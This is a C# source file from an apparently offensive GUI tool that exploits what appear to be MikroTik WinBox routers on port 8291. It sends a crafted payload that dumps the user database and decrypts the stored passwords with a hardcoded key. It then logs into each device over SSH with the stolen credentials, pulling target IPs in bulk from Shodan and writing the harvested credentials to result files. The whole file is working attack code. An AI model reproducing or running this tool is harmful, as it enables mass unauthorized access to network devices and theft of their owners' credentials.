using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Runtime.Intrinsics.X86;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using OelianderUI.Views;
using System.Windows.Threading;

namespace OelianderUI.Helpers;

public class ScanHelper
{
    #region Locals

    // private readonly object locker = new object();
    // private readonly Stopwatch timer = new Stopwatch();
    private bool loggerInvoke { get; set; }
    public int inheritance = 0;
    public MainPage mainFormObject { get; set; }
    private Action<string, object> logger { get; set; }
    private List<string> errorList { get; set; }
    private string resultPath { get; set; }
#if DEBUG
    public bool debugMod = true;
#else
    public bool debugMod = false;
#endif
    public bool working = false;
    private static string ScanTime { get; set; }
    private readonly ReaderWriterLockSlim _readWriteLock = new();
    public static string _using { get; set; }
    private List<User> usersList { get; set; }
    public static string DecryptionKey = "283i4jfkai3389";
    public static int BufferSize = 1024;

#endregion Locals


    public void SaveScanTime()
    {
        ScanTime = DateTime.Now.ToString("T");//GetTime().Replace("\\", "-");
    }
    public List<User> GetUsers(string ip, int port = 8291)
    {
        IPAddress addr = null;
        try { addr = IPAddress.Parse(ip); }
        catch
        {
            mainFormObject.Dispatcher.Invoke(() =>
            {
                mainFormObject.AddLog($"[-] '{ip}' is not a valid IP!");
            });
#if DEBUG
            Console.WriteLine($"'{ip}' is not a valid IP!");
#endif
            return null;
        }

#pragma warning disable IDE0007 // Use implicit type
        byte[] ResponseBytes = new byte[BufferSize];
#pragma warning restore IDE0007 // Use implicit type
        using (Socket Socket = new Socket(addr.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
        {
            Socket.ReceiveTimeout = Convert.ToInt32(MainPage.settings.Connection_Timeout);
            Socket.SendTimeout = Convert.ToInt32(MainPage.settings.Connection_Timeout);

            try { Socket.Connect(new IPEndPoint(addr, port)); }
            catch (SocketException ex)
            {
                mainFormObject.Dispatcher.Invoke(() =>
                {
                    mainFormObject.AddToLogFile($"[-] {ip}: Timed out! {ex.Message}");
                });
#if DEBUG
                Console.WriteLine($"{ip}: Timed out!");
#endif
                return null;
            }
            catch (Exception ex)
            {
                mainFormObject.Dispatcher.Invoke(() =>
                {
                    mainFormObject.AddToLogFile($"[-] {ip}: Unknown error: {ex.Message} \n");
                    mainFormObject.AddLog($"[-] {ip}: Unknown error: {ex.Message}");
                });
#if DEBUG
                Console.WriteLine($"{ip}: Unknown error: {ex.Message}");
#endif
                return null;
            }

            Socket.Send(Payloads.Hello_Payload);

            ResponseBytes = new byte[BufferSize];
            try { Socket.Receive(ResponseBytes, BufferSize, SocketFlags.None); }
            catch (SocketException ex)
            {
                mainFormObject.Dispatcher.Invoke(() =>
                {
                    mainFormObject.AddLog($"[-] {ip}: {ex.Message}");
                });
#if DEBUG
                Console.WriteLine($"{ip}: {ex.Message}");
#endif
                return null;
            }

            // inject session id into dump payload
            var DumpPayload = Payloads.UserDatPayload;
            DumpPayload[19] = ResponseBytes[38];
            Socket.Send(DumpPayload); // send malicious payload

            ResponseBytes = new byte[BufferSize];
            Socket.Receive(ResponseBytes, BufferSize, SocketFlags.None); // receive byte array of user.dat
        }

#pragma warning disable IDE0007 // Use implicit type
        ResponseBytes = ResponseBytes.Skip(55).ToArray(); // remove header
        List<byte[]> ByteUsersList = ResponseBytes.Split(new byte[] { 0xff }).Skip(1).ToList(); // split user.dat up by user list

        List<User> Users = new List<User>();
        foreach (byte[] dumpeduser in ByteUsersList) // loop all dumped users
        {
            try
            {
                byte[] usernameArray = dumpeduser.Split(new byte[] { 0x01, 0x00, 0x00, 0x21 })[1];
                byte[] passwordArray = dumpeduser.Split(new byte[] { 0x11, 0x00, 0x00, 0x21 })[1];

                byte[] usernameBytes = usernameArray.Skip(1).Take(usernameArray[0]).ToArray();
                byte[] passwordBytes = passwordArray.Skip(1).Take(usernameArray[0]).ToArray();

                byte[] KeyBytes = usernameBytes.Concat(Encoding.ASCII.GetBytes(DecryptionKey)).ToArray();
                byte[] Key = MD5.Create().ComputeHash(KeyBytes);
                string password = "";
                for (int i = 0; i < passwordBytes.Length; i++)
                    password += (char)(passwordBytes[i] ^ Key[i % Key.Length]);

#pragma warning restore IDE0007 // Use implicit type
                Users.Add(new User(Encoding.ASCII.GetString(usernameBytes), password));
            }
            catch { }
        }

        return Users;
    }
    public void TryInfect(string ip, User user)
    {
        SSH ssh = new SSH(ip, user.Username, user.Password);
        if (ssh.TryConnect())
        {
            ssh.SendCMD("whoami", mainFormObject);
            mainFormObject.Dispatcher.Invoke(() =>
            {
                mainFormObject.AddLog($"[+] SUCCESS: '{user.Username}@{ip}' using password: {user.Password}\n-------------------------------\n");
                mainFormObject.AddToLogFile($"[+] SUCCESS: '{user.Username}@{ip}' using password: {user.Password}");
                mainFormObject.AddCred(user, ip, true);
            });
#if DEBUG
            Console.WriteLine($"SUCCESS: '{user.Username}@{ip}' using password: {user.Password}");
#endif
        }
        else
        {
            mainFormObject.Dispatcher.Invoke(() =>
            {
                mainFormObject.AddLog($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}\n-------------------------------\n");
                mainFormObject.AddToLogFile($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}\n");
                mainFormObject.AddCred(user, ip, false);
            });
#if DEBUG
            Console.WriteLine($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}");
#endif
        }
    }
    public void TryInfectAsync(string ip, User user)
    {
        SSH ssh = new SSH(ip, user.Username, user.Password);
        if (ssh.TryConnect())
        {
            ssh.SendCMD("whoami", mainFormObject);
            mainFormObject.Dispatcher.Invoke(() =>
            {
                mainFormObject.AddLog($"[+] SUCCESS: '{user.Username}@{ip}' using password: {user.Password}\n-------------------------------\n");
                mainFormObject.AddToLogFile($"[+] SUCCESS: '{user.Username}@{ip}' using password: {user.Password}");
                mainFormObject.AddCred(user, ip, true);
            });
#if DEBUG
            Console.WriteLine($"SUCCESS: '{user.Username}@{ip}' using password: {user.Password}");
#endif
        }
        else
        {
            mainFormObject.Dispatcher.Invoke(() =>
            {
                mainFormObject.AddLog($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}\n-------------------------------\n");
                mainFormObject.AddToLogFile($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}\n");
                mainFormObject.AddCred(user, ip, false);
            });
#if DEBUG
            Console.WriteLine($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}");
#endif
        }
    }

    public string GetTime()
    {
        return "[" + DateTime.Now.ToString("G") + "]";
    }

    public void addLog(string text, object dataTwo = null)
    {
        try
        {
            text = "[" + DateTime.Now.ToString("G") + "] - " + text + "";
            if (dataTwo != null)
            {
                mainFormObject.Dispatcher.Invoke(() =>
                {
                    mainFormObject.AddLog(text + " " + Convert.ToString(dataTwo));
                    mainFormObject.AddToLogFile(text);
                });
                logger(text, dataTwo);
            }
            else
            {
                mainFormObject.Dispatcher.Invoke(() =>
                {
                    mainFormObject.AddLog(text);// + Environment.NewLine);
                    mainFormObject.AddToLogFile(text);
                });
                logger(text, null);
            }
        }
        catch (Exception E)
        {
            HandleException(E);
        }
    }

    public void Save(string data, string type)
    {
        _readWriteLock.EnterWriteLock();
        try
        {
            resultPath = Directory.GetCurrentDirectory() + "\\Results";
            if (!Directory.Exists(resultPath))
            {
                Directory.CreateDirectory(resultPath);
            }
            if (!Directory.Exists($@"{resultPath}\WinBox"))
            {
                Directory.CreateDirectory($@"{resultPath}\WinBox");
            }
            var fileNM = $@"{resultPath}\WinBox\{ScanTime.Replace(":", "_")}-{type}.txt";
            using StreamWriter st = File.AppendText(fileNM);
            st.WriteLine(data);
        }
        finally
        {
            _readWriteLock.ExitWriteLock();
        }
    }
    public void SaveShodan(string data)
    {
        _readWriteLock.EnterWriteLock();
        try
        {
            resultPath = Directory.GetCurrentDirectory() + "\\Results";
            if (!Directory.Exists(resultPath))
            {
                Directory.CreateDirectory(resultPath);
            }
            if (!Directory.Exists($@"{resultPath}\ShodanScan"))
            {
                Directory.CreateDirectory($@"{resultPath}\ShodanScan");
            }
            var fileNM = $@"{resultPath}\ShodanScan\{ScanTime.Replace(":", "_")}-CollectedIPs.txt";
            using StreamWriter st = File.AppendText(fileNM);
            st.WriteLine(data);
        }
        finally
        {
            _readWriteLock.ExitWriteLock();
        }
    }
    public void HandleException(Exception E)
    {
        errorList ??= new List<string>();
        if (debugMod)
        {
            StackTrace trace = new StackTrace(E, true);
            var data = trace.GetFrame(0).GetFileLineNumber().ToString() + ": " + E.Message;
            if (!errorList.Contains(data))
            {
                errorList.Add(data);
                addLog(data);
                Save(data, "Error");
            }
        }
    }
    private void TryExploit(string target)
    {
        usersList = new List<User>();
        try
        {
            if (target.EndsWith(".txt"))
            {
                var _ip = File.ReadAllLines(target);
                foreach (var _tar in _ip)
                {
                    usersList = GetUsers(_tar);
                    mainFormObject.AddCred(usersList, _tar);
                    if (usersList != null && usersList.Count > 0)
                    {
                        List<Thread> sshThreads = new List<Thread>();
                        foreach (User user in usersList)
                        {
                            mainFormObject.Dispatcher.Invoke(() =>
                            {
                                mainFormObject.AddLog($"[!] {GetTime()} CREDENTIALS FOUND:\n Username: {user.Username.PadRight(32)} Password: {user.Password}".PadRight(32) + $"IPAddress: {target}");
                            });
                            Save($"Username: {user.Username}".PadRight(32) + $"Password: {user.Password}".PadRight(32) + $"IPAddress: {target}", "Credentials");
#if DEBUG
                            Console.WriteLine($"Username: {user.Username}".PadRight(32) + $"Password: {user.Password}", "Complete");
#endif
                            sshThreads.Add(new Thread(() => TryInfect(_tar, user)));
                        }

                        foreach (User user in usersList)
                        {
                            mainFormObject.Dispatcher.Invoke(() =>
                            {
                                mainFormObject.AddLog($"[?] Attempting to SSH into '{user.Username}@{_tar}' using password: {user.Password}");// + Environment.NewLine);
                            });
                            var _1 = $"Attempting to SSH into '{user.Username}@{_tar}' using password: {user.Password}";
                            Save(_1, "List");
#if DEBUG
                            Console.WriteLine(_1);
#endif
                        }
                        Parallel.ForEach(sshThreads, thread =>
                        {
                            thread.Start();
                            thread.Join();
                        });
                        foreach (CollectionListing _cred in MainPage._collectionList)
                            Save(_cred.Index + ": " + _cred.Username.PadRight(32) + _cred.Password.PadRight(32) + _cred.IPAddress, "Credentials");
                    }
                    else
                    {
                        mainFormObject.Dispatcher.Invoke(() =>
                        {
                            mainFormObject.AddLog("[!] Exploit Failed: Target " + _tar + " might not be vulnerable!");// + Environment.NewLine);
                            mainFormObject.AddToLogFile("[!] Exploit Failed: Target " + _tar + " might not be vulnerable!\n");// + Environment.NewLine);
                        });
                    }
                }
            }
            else
            {
                List<User> users = GetUsers(target);
                if (users != null && users.Count > 0)
                {
                    List<Thread> sshThreads = new List<Thread>();
                    mainFormObject.Dispatcher.Invoke(() =>
                    {
                        mainFormObject.AddLog($"[+] {GetTime()} CREDENTIALS FOUND:");
                    });
                    foreach (User user in users)
                    {

                        mainFormObject.Dispatcher.Invoke(() =>
                        {
                            mainFormObject.AddLog($"[+] Username: {user.Username}".PadRight(32) + $"Password: {user.Password}".PadRight(32) + $"IPAddress: {target}");
                            mainFormObject.AddToLogFile($"[+] Username: {user.Username}".PadRight(32) + $"Password: {user.Password}".PadRight(32) + $"IPAddress: {target}");
                        });
                        var _1 = $"Username: {user.Username}".PadRight(32) + $"Password: {user.Password}".PadRight(32) + $"IPAddress: {target}";
                        Save(_1, "Credentials");
#if DEBUG
                        Console.WriteLine(_1);
#endif

                        ///
                        // Running SSH Scans Simultanisously using Threads
                        ///
                        //Thread.Sleep(3000);
                        //sshThreads.Add(new Thread(() => TryInfect(target, user)));
                        //Thread.Sleep(3000);

                        //}
                        //foreach (User user in users)
                        //{
                        //    mainFormObject.Dispatcher.Invoke(() =>
                        //    {
                        //        mainFormObject.addLog($"[?] Attempting to SSH into '{user.Username}@{target}' using password: {user.Password}");// + Environment.NewLine);
                        //    });
                        //    Console.WriteLine($"Attempting to SSH into '{user.Username}@{target}' using password: {user.Password}");
                        //}
                        ////mainFormObject.addCred(users, target);
                        //Parallel.ForEach(sshThreads, thread =>
                        //{
                        //    thread.Start();
                        //    thread.Join();
                        //});
                        //Console.WriteLine("#############################");


                        ///
                        // Running SSH Connection in a queue
                        ///
                        mainFormObject.Dispatcher.Invoke(() =>
                        {
                            mainFormObject.AddLog($"[?] Attempting to SSH into '{user.Username}@{target}' using password: {user.Password}");// + Environment.NewLine);
                        });
#if DEBUG
                        Console.WriteLine($"Attempting to SSH into '{user.Username}@{target}' using password: {user.Password}");
#endif
                        TryInfectAsync(target, user);
                    }
                    Thread.Sleep(2000);
                    mainFormObject.FillList();
                }
                else
                {
                    mainFormObject.Dispatcher.Invoke(() =>
                    {
                        mainFormObject.AddLog("[!] Exploit Failed: Target " + target + " might not be vulnerable!");// + Environment.NewLine);
                        mainFormObject.AddToLogFile("[!] Exploit Failed: Target " + target + " might not be vulnerable!\n");// + Environment.NewLine);
                    });
#if DEBUG
                    Console.WriteLine("Exploit Failed: Target might not be vulnerable!");
#endif
                }
            }
            mainFormObject.ScanStop();
        }
        catch (Exception ex)
        {
            var dialogWindow = new ShellDialogWindow("Exploit Failed", ex.Message, true);
            dialogWindow.ShowDialog();
#if DEBUG
            Console.WriteLine(ex.Message.ToString());
            Console.ReadLine();
#endif
        }
    }

    public static ShodanResponse _results;
    public static string _osVersion;
    public string _use;
    private static Thread threadRunner;
    public void Start(bool usingShodan, string _intTarget)
    {
        var ShodanScan = "";
        if (usingShodan) { ShodanScan = "(Shodan Scan) "; }
        else { ShodanScan = ""; }
        mainFormObject.AddToLogFile("\t[!] Scan Started" + ShodanScan + ": " + GetTime() + Environment.NewLine + Environment.NewLine);
        mainFormObject.Dispatcher.Invoke(() =>
        {
            mainFormObject.StartScanButton.Content = "Stop";
        });            
        _using = _osVersion = _intTarget;
        try
        {
            working = true;
            if (usingShodan)
            {
                mainFormObject.Dispatcher.Invoke(() =>
                {
                    mainFormObject.AddLog($"[!] [{DateTime.Now.ToString("G")}]: Shodan Scan Started!\n\n");// + Environment.NewLine);
                });
                threadRunner = new Thread(ShodanScanner.GetShodanSearch);
                threadRunner.Start();
                do
                    Thread.Sleep(5000);
                while (threadRunner.IsAlive);
                if (ShodanScanner._continue)
                {
                    _results = ShodanScanner.sr;
                    mainFormObject.Dispatcher.Invoke(() =>
                    {
                       // mainFormObject.AddTargetNum(_results.matches.Count);
                        mainFormObject.AddLog("[*] Found " + _results.matches.Count + " target IP's");
                        mainFormObject.AddToLogFile("[*] Found " + _results.matches.Count + " target IP's");
                    });
#if DEBUG
                    Console.WriteLine("Found " + _results.matches.Count + " IP's");
#endif
                    foreach (Match m in _results.matches)
                    {
                        SaveShodan($"FOUND IPADDRESS: {m.ip}");
                        if (!mainFormObject.SaveShodanOnly)
                        {
                            mainFormObject.Dispatcher.Invoke(() =>
                            {
                                mainFormObject.AddLog($"[?] Attempting to Exploit: {m.ip_str}");
                                mainFormObject.AddToLogFile($"[?] Attempting to Exploit: {m.ip_str}\n");
                            });
                            //Console.WriteLine($"Attempting: {m.ip_str}");
                            _using = m.ip_str;
                            _use = m.ip_str;
                            Thread tr = new Thread(() => TryExploit(m.ip_str));
                            tr.Start();
                        }
                    }
                }
            }
            else
            {
                string _;
                if (_using.EndsWith(".txt"))
                    _ = $"IPList: {_intTarget}";
                else
                    _ = $"IP: {_intTarget}";
                mainFormObject.Dispatcher.Invoke(() =>
                {
                    mainFormObject.AddLog($"[!] [{DateTime.Now.ToString("G")}]: Scan Started!\n\n[?] Attempting to exploit provided {_}");// + Environment.NewLine);
                });
                threadRunner = new Thread(() => TryExploit(_intTarget));
                threadRunner.Start();
            }
        }
        catch (Exception E)
        {
            HandleException(E);
            var dialogWindow = new ShellDialogWindow("Scan Error", E.Message, true);
            dialogWindow.ShowDialog();
        }
    }

    public void Stop()
    {
        mainFormObject.AddLog(GetTime() + ": Scan Threads are being Aborted");
        if (threadRunner.IsAlive)
        {
            try
            {
                // Use a cancellation token to signal the thread to stop
                var cts = new CancellationTokenSource();
                cts.Cancel();
                threadRunner.Join(); // Wait for the thread to finish
            }
            catch (Exception ex)
            {
#if DEBUG
                Console.WriteLine(ex.ToString());
#endif
                mainFormObject.AddLog(ex.ToString());
                var dialogWindow = new ShellDialogWindow("Error", ex.Message, false);
                dialogWindow.ShowDialog();
            }
        }
        Thread.Sleep(5000);
        mainFormObject.AddLog($"[!] {GetTime()} Scan stopped successfully\n");
        mainFormObject.AddToLogFile("\n\n\t[*] End of Scan: " + GetTime() + "\n\n###############################################################################\n\n");
        mainFormObject.Dispatcher.Invoke(() =>
        {
            mainFormObject.StartScanButton.Content = "Start";
        });
    }
    public ScanHelper(Action<string, object> objLogger, bool needInvoke, MainPage main)
    {
        mainFormObject = main;
        logger = objLogger;
        loggerInvoke = needInvoke;
    }
}
